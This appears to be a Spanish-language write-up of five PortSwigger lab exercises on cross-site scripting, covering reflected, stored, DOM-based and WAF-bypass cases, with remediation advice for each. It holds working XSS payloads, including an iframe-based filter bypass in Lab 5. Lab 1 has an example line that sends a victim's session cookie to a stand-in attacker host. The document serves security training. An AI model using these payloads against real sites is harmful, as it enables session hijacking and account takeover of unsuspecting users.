# XSS Labs — PortSwigger Web Security Academy
 
Colección de laboratorios prácticos de Cross-Site Scripting (XSS) completados
en PortSwigger Web Security Academy. Los labs cubren los tres tipos de XSS
(Reflected, Stored y DOM-based) y técnicas de bypass de filtros.
 
---
 
## Lab 1 — Reflected XSS into HTML context with nothing encoded
 
**Vulnerabilidad:** XSS reflejado en barra de búsqueda
**Objetivo:** ejecutar JavaScript en el navegador de la víctima via URL
 
### Contexto de inyección
El input del usuario se refleja directamente en el HTML de la respuesta
sin ningún tipo de sanitización ni encoding.
 
### Payload usado
```html
<script>alert(1)</script>
```
 
### Cómo funciona
El servidor inserta el input directamente en el HTML:
```html
<p>No results for: <script>alert(1)</script></p>
```
El navegador parsea el HTML, encuentra la etiqueta `<script>` y ejecuta
el código JavaScript inmediatamente.
 
### Por qué es "reflejado"
El payload viaja en la URL (`?search=<script>...`), el servidor lo
refleja en la respuesta y el navegador lo ejecuta. No se almacena
en ningún lado — cada víctima necesita hacer clic en el enlace malicioso.
 
### Resultado
Alerta ejecutada en el navegador. Lab resuelto.
 
### Impacto en escenario real
Un atacante envía a la víctima un enlace con el payload en la URL.
Al abrirlo, puede robar su cookie de sesión con:
```javascript
<script>document.location='https://atacante.com/?c='+document.cookie</script>
```
Con esa cookie, el atacante toma control de la sesión sin necesitar
usuario ni contraseña.
 
### Remediación
- Sanitizar y encodear el input antes de insertarlo en HTML
- Implementar Content Security Policy (CSP)
- Usar frameworks modernos que escapan output automáticamente
---
 
## Lab 2 — Stored XSS into HTML context with nothing encoded
 
**Vulnerabilidad:** XSS almacenado en sección de comentarios de un blog
**Objetivo:** ejecutar JavaScript en el navegador de cualquier usuario
que visite la publicación
 
### Contexto de inyección
El comentario del usuario se guarda en la base de datos y se renderiza
sin sanitización cada vez que alguien visita esa publicación.
 
### Payload usado
```html
<script>alert(1)</script>
```
 
### Cómo funciona
A diferencia del XSS reflejado, aquí el payload se almacena en la BD:
```
Usuario escribe comentario → BD guarda el script → cualquier visitante
carga la página → servidor inserta el script en el HTML → navegador
ejecuta el código
```
 
### Por qué es más peligroso que el reflejado
No requiere que la víctima haga clic en ningún enlace. Cualquier
persona que visite la página con el comentario malicioso es atacada
automáticamente — incluyendo administradores con privilegios elevados.
 
### Resultado
La alerta se ejecuta cada vez que cualquier usuario visita la publicación.
 
### Impacto en escenario real
Si un administrador visita la página, el atacante puede ejecutar
acciones con sus privilegios: crear usuarios, cambiar configuraciones,
extraer datos sensibles. Un solo payload afecta a todos los visitantes
de forma permanente hasta que se elimine.
 
### Remediación
- Sanitizar y encodear el input antes de guardarlo en BD
- Sanitizar también al momento de renderizar (doble capa)
- Implementar CSP
- Validar y rechazar HTML en campos que no lo requieren
---
 
## Lab 3 — DOM XSS in document.write sink using source location.search
 
**Vulnerabilidad:** DOM XSS via `document.write` en barra de búsqueda
**Objetivo:** ejecutar JavaScript manipulando el DOM directamente
 
### Contexto de inyección
El código JavaScript de la página toma el valor de `location.search`
(la URL) y lo inserta en el DOM usando `document.write`:
```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```
El payload termina dentro del atributo `src` de una etiqueta `<img>`.
 
### Por qué `<script>` no funciona aquí
El payload se inserta dentro de un atributo HTML existente, no en
HTML libre. El navegador ya está parseando un atributo cuando encuentra
el input — una etiqueta `<script>` dentro de un atributo no se ejecuta.
 
### Payload usado
```
prueba" onload="alert(1)
```
 
### Cómo funciona el payload
El input cierra el atributo `src` con `"`, luego inyecta un nuevo
atributo `onload` con el código JavaScript:
```html
<!-- Antes del payload -->
<img src="/tracker.gif?searchTerms=prueba">
 
<!-- Después del payload -->
<img src="/tracker.gif?searchTerms=prueba" onload="alert(1)">
```
Cuando la imagen carga, `onload` se dispara y ejecuta `alert(1)`.
 
### Diferencia clave con XSS clásico
Este ataque ocurre completamente en el navegador — el payload nunca
llega al servidor. El servidor envía JavaScript legítimo que lee la URL
y construye el DOM dinámicamente. Los filtros del servidor no pueden
detectarlo porque nunca ven el payload.
 
### Resultado
Alerta ejecutada via atributo de evento HTML. Lab resuelto.
 
### Impacto en escenario real
Mismo impacto que XSS reflejado pero más difícil de detectar —
los WAFs y filtros del servidor son ciegos a este tipo de ataque.
 
### Remediación
- Nunca usar `document.write` con input del usuario
- Usar `textContent` en vez de `innerHTML` para insertar texto
- Sanitizar input antes de pasarlo a funciones DOM peligrosas
---
 
## Lab 4 — DOM XSS in innerHTML sink using source location.search
 
**Vulnerabilidad:** DOM XSS via `innerHTML`
**Objetivo:** ejecutar JavaScript a través de un elemento HTML
 
### Contexto de inyección
El código JavaScript inserta el input del usuario usando `innerHTML`:
```javascript
document.getElementById('resultado').innerHTML = query;
```
 
### Por qué `<script>` no funciona aquí
`innerHTML` ignora etiquetas `<script>` por diseño del navegador —
es una restricción de seguridad del estándar HTML5. Los scripts
insertados via `innerHTML` no se ejecutan.
 
### Payload usado
```html
<img src=0 onerror=alert(1)>
```
 
### Cómo funciona el payload
- `src=0` → referencia a una imagen inválida, provoca un error de carga
- `onerror=alert(1)` → cuando la imagen falla al cargar, ejecuta el código
`innerHTML` sí acepta otros elementos HTML como `<img>` y sus atributos
de evento (`onerror`, `onload`). El error es inmediato porque `src=0`
nunca va a cargar una imagen válida.
 
### Resultado
Alerta ejecutada via evento `onerror` de elemento `<img>`. Lab resuelto.
 
### Impacto en escenario real
Mismo impacto que los anteriores. La diferencia está en la técnica
de bypass — demuestra que no hay un payload XSS universal: el contexto
de inyección determina qué técnica usar.
 
### Remediación
- Usar `textContent` en vez de `innerHTML`
- Si `innerHTML` es necesario, sanitizar con DOMPurify antes de insertar
- Implementar CSP que bloquee inline scripts
---
 
## Lab 5 — Reflected XSS into HTML context with most tags and attributes blocked
 
**Vulnerabilidad:** XSS reflejado con filtros activos
**Objetivo:** ejecutar JavaScript bypasseando un WAF que bloquea
la mayoría de tags y atributos conocidos
 
### Contexto de inyección
La aplicación tiene un WAF que bloquea tags comunes (`<script>`,
`<img>`, atributos como `onerror`, `onload`, etc.) y devuelve
"Tag not allowed" cuando los detecta.
 
### Proceso de bypass
 
**Paso 1:** identificar qué tags no están bloqueados usando Intruder
de Burp con una lista de todos los tags HTML válidos.
Resultado: `<body>` no está bloqueado.
 
**Paso 2:** identificar qué atributos de evento no están bloqueados.
Resultado: `onresize` no está bloqueado.
 
**Paso 3:** construir el payload base:
```html
<body onresize=print()>
```
 
**Problema:** `onresize` solo se dispara cuando la ventana cambia
de tamaño — un usuario real no va a hacer eso manualmente.
 
**Paso 4:** automatizar el resize con un `<iframe>`:
```html
<iframe src="[URL-del-lab]?search=<body onresize=print()>"
onload="this.style.width='100px'">
```
 
### Cómo funciona el payload completo
1. El `iframe` carga la página vulnerable con el payload en la URL
2. Cuando el iframe termina de cargar (`onload`), cambia su propio ancho
3. Ese cambio de ancho dispara el evento `resize` dentro del iframe
4. `onresize` se ejecuta → `print()` corre
### Por qué este enfoque es poderoso en Red Team
Demuestra que los WAFs basados en blacklists son insuficientes —
siempre habrá combinaciones de tags y atributos que no están en
la lista negra. Un atacante con tiempo puede encontrar el bypass.
 
### Resultado
Diálogo de impresión ejecutado via `onresize` en tag `<body>`
dentro de `iframe`. Lab resuelto.
 
### Impacto en escenario real
El atacante envía a la víctima una página que contiene el `iframe`.
Al visitarla, el resize ocurre automáticamente sin ninguna interacción
del usuario — el ataque es completamente transparente.
 
### Remediación
- CSP estricto que bloquee inline event handlers
- Whitelist de tags permitidos en vez de blacklist de tags prohibidos
- Sanitización con librerías especializadas como DOMPurify
---
 
## Resumen — Tipos de XSS y contextos de inyección
 
| Tipo | Contexto | Payload | Requiere interacción |
|---|---|---|---|
| Reflected | HTML libre | `<script>alert(1)</script>` | Clic en enlace |
| Stored | HTML libre | `<script>alert(1)</script>` | Ninguna |
| DOM (document.write) | Atributo HTML | `" onload="alert(1)` | Clic en enlace |
| DOM (innerHTML) | innerHTML | `<img src=0 onerror=alert(1)>` | Clic en enlace |
| Reflected + WAF bypass | HTML libre | `<body onresize=print()>` + iframe | Clic en enlace |
 
## Lección principal
No existe un payload XSS universal. El contexto donde se inserta
el input determina qué técnica usar:
- HTML libre → `<script>`
- Dentro de atributo → cerrar atributo + agregar evento
- innerHTML → elementos con atributos de evento (`onerror`, `onload`)
- Con filtros → identificar tags/atributos no bloqueados + automatizar trigger
 
